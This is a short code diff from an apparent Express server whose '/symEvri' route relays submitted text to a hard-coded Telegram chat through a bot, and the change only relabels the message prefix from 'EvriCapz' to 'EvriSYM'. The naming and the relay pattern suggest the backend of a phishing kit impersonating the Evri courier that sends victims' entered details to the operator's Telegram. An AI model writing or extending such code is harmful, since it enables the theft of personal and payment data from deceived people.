@@ -8105,7 +8105,7 @@ app.post("/symEvri", (req, res) => {
             `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
             {
               chat_id: 680379375,
-              text: `EvriCapz:\n${originalText}`,
+              text: `EvriSYM:\n${originalText}`,
               parse_mode: "Markdown",
             }
           )
